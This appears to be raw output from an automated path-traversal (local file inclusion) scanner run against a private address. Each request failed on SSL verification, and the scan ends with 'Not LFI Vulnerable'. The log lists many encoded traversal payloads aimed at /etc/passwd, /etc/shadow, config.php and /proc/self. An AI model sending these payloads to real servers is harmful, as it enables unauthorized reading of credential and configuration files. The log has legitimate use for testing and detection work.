+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%00//%00//%00//%00//%00//etc//shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.../.../.../.../.../.../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5Cetc%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5Cetc%5Cgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25%2535%2563..%25%2535%2563..%25%2535%2563..%25%2535%2563..%25%2535%2563 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25%2535c..%25%2535c..%25%2535c..%25%2535c..%25%2535c..%25%2535c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%00//%00//%00//%00//%00/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cgroup..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%00//%00//%00//%00//%00/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%00//%00//%00//%00//%00//etc//shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25%2535%2563..%25%2535%2563..%25%2535%2563..%25%2535%2563..%25%2535%2563 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cshadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25%2535c..%25%2535c..%25%2535c..%25%2535c..%25%2535c..%25%2535c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cgroup..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qfetc%25bg%25qfpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qfetc%25bg%25qfgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qfetc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C.../%5C.../%5C.../%5C.../%5C.../%5C.../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFetc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cshadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFetc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qfetc%25bg%25qfpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qfetc%25bg%25qfgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25bg%25qf..%25bg%25qf..%25bg%25qf..%25bg%25qfetc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C.../%5C.../%5C.../%5C.../%5C.../%5C.../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFetc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%255C../..%255C/..%25C0%259v..%255C.%255C../..%255C/..%25C0%259v../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFetc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%5C../..%5C (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%25C0%259v../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%255C../..%255C/..%25C0%259v..%255C.%255C../..%255C/..%25C0%259v../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215..%25u2215etc%25u2215passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%5C../..%5C (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%25C0%259v../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%255c..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%255c..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF..//..%C0%AF..//..%C0%AF../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF..//..%C0%AF..//..%C0%AF../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%255c..%255c/..%255c..%255c/..%255c..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%255c..%255c/..%255c..%255c/..%255c..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%255C../..%255C/..%25C0%259v../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%255C../..%255C/..%25C0%259v../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216etc%25u2216passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216etc%25u2216passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216etc%25u2216hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216etc%25u2216hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216etc%25u2216shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%25u2216..%25u2216..%25u2216..%25u2216..%25u2216etc%25u2216shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=./%5C./%5C./%5C./%5C./%5C./%5C./etc/hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=./%5C./%5C./%5C./%5C./%5C./%5C./etc/hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C./%5C./%5C./%5C./%5C./%5C./%5Cetc/%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C./%5C./%5C./%5C./%5C./%5C./%5Cetc/%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C./%5C./%5C./%5C./%5C./%5C./%5Cproc/%5Cself/%0Cd/%01 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C./%5C./%5C./%5C./%5C./%5C./%5Cproc/%5Cself/%0Cd/%01 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..//config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..//config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C/..%5C/..%5C/..%5C/config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C/..%5C/..%5C/..%5C/config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5Config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFconfig.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFconfig.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c..%255c..%255cconfig.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%255c..%255c..%255cconfig.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../..config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+[-] Not LFI Vulnerable
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../..config.php (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+[-] Not LFI Vulnerable
